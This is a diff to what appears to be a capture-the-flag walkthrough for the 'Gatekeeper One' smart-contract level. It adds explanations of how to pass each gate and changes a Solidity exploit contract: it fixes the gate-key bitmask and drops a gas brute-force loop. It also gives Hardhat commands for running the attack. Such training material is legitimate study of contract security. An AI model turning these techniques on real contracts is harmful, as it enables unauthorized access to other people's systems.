@@ -94,13 +94,20 @@ Gate One requires `msg.sender != tx.origin`. This is straightforward to bypass b
 
 ### Gate Two Solution
 
-Gate Two requires `gasleft() % 8191 == 0`. This is tricky because the gas consumption up to that point depends on many factors. The solution is to:
+Gate Two requires `gasleft() % 8191 == 0`. This is tricky because the gas consumption up to that point depends on many factors including:
 
-1. Start with a high base gas value
-2. Try different gas amounts by incrementing in small steps
-3. Find the exact value where the remaining gas at the gate check is divisible by 8191
+- The exact compiler version used
+- The optimization level
+- The way the contract is deployed
+- The specific blockchain network
 
-This typically requires brute-forcing, but once found, the correct gas value can be reused.
+The solution is to try a series of strategic gas values that might result in the remaining gas being divisible by 8191 at the exact moment the check happens. Some approaches include:
+
+1. Try multiples of 8191 plus some offset (like 8191*10 + 100)
+2. Try values that have worked in similar setups (around 24000-25500)
+3. Try a systematic approach by testing a range of values in small increments
+
+This is implemented in our execution script, which tries multiple pre-selected values that are likely to work.
 
 ### Gate Three Solution
 
@@ -144,16 +151,27 @@ contract GatekeeperOneExploit {
     }
     
     function generateGateKey(address _origin) public pure returns (bytes8) {
+        // We need to craft a key that meets three conditions:
+        // 1. uint32(uint64(key)) == uint16(uint64(key))
+        //    This means the lower 2 bytes must match when converting to uint16 and uint32
+        //    So bytes 2-3 must be 0
+        //
+        // 2. uint32(uint64(key)) != uint64(key)
+        //    This means at least some bits in bytes 4-7 must be non-zero
+        //
+        // 3. uint32(uint64(key)) == uint16(uint160(tx.origin))
+        //    This means the lower 2 bytes must match the lower 2 bytes of tx.origin
+        
         // Extract the last 2 bytes (16 bits) of the address
         uint16 addressPart = uint16(uint160(_origin));
         
-        // Start with the address part
+        // For condition 1 and 3: Create a key where the lower 16 bits are the address bits
+        // and bytes 2-3 are zeros
         uint64 key = uint64(addressPart);
         
-        // Add a pattern in the higher bits that will make:
-        // - The conversion to uint32 drops some non-zero bits (for condition 2)
-        // - But the lower 16 bits still match the address part (for conditions 1 and 3)
-        key = key | (uint64(0xFFFFFFFF0000FFFF));
+        // For condition 2: Make sure bytes 4-7 have some non-zero bits
+        // We'll set them all to 1s
+        key = key | (uint64(0xFFFFFFFF00000000));
         
         return bytes8(key);
     }
@@ -162,35 +180,15 @@ contract GatekeeperOneExploit {
         require(msg.sender == owner, "Only owner can call");
         gasToUse = _gasToUse;
         
-        // Generate the gate key based on tx.origin
+        // Generate the gate key based on tx.origin (the original caller)
         bytes8 gateKey = generateGateKey(tx.origin);
         
         // Call the enter function with the specified gas
+        // Make sure we have a high enough gas limit for the overall transaction
+        // but control the gas sent to the target contract
         bool result = IGatekeeperOne(gatekeeperAddress).enter{gas: _gasToUse}(gateKey);
         
         success = result;
-    }
-    
-    function bruteForceGas(uint256 _baseGas, uint256 _iterations) external {
-        require(msg.sender == owner, "Only owner can call");
-        require(_iterations <= 120, "Too many iterations");
-        
-        bytes8 gateKey = generateGateKey(tx.origin);
-        
-        // Try different gas values around the base value
-        for (uint256 i = 0; i < _iterations; i++) {
-            uint256 gasToTry = _baseGas + i;
-            
-            try IGatekeeperOne(gatekeeperAddress).enter{gas: gasToTry}(gateKey) returns (bool result) {
-                if (result) {
-                    gasToUse = gasToTry;
-                    success = true;
-                    return;
-                }
-            } catch {
-                // Continue to the next iteration
-            }
-        }
     }
     
     function checkSuccess() external view returns (bool) {
@@ -229,7 +227,11 @@ TARGET_ADDRESS=0xYourGatekeeperOneAddress npx hardhat deploy --tags gatekeeper-o
 Run the provided script to execute the attack:
 
 ```shell
+# If running on a testnet like Sepolia
 EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia
+
+# If running locally
+EXPLOIT_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network localhost
 ```
 
 Parameters:
@@ -237,10 +239,12 @@ Parameters:
 - `TARGET_ADDRESS`: Optional - will use the target address stored in the exploit contract if not provided
 
 The script will:
-1. Try to brute-force the correct gas value to pass Gate Two
-2. Generate the correct gate key for your address to pass Gate Three
+1. Generate the correct gate key for your address to pass Gate Three
+2. Try a series of carefully selected gas values that are likely to work for Gate Two
 3. Call the enter function through your exploit contract to pass Gate One
 4. Verify that you've successfully become the entrant
+
+Note: Finding the correct gas value might require multiple attempts. The script tries several values that have worked in practice, but if none work, you might need to adjust the gas values in the script based on your specific environment.
 
 ### 4. Verify Your Success
 
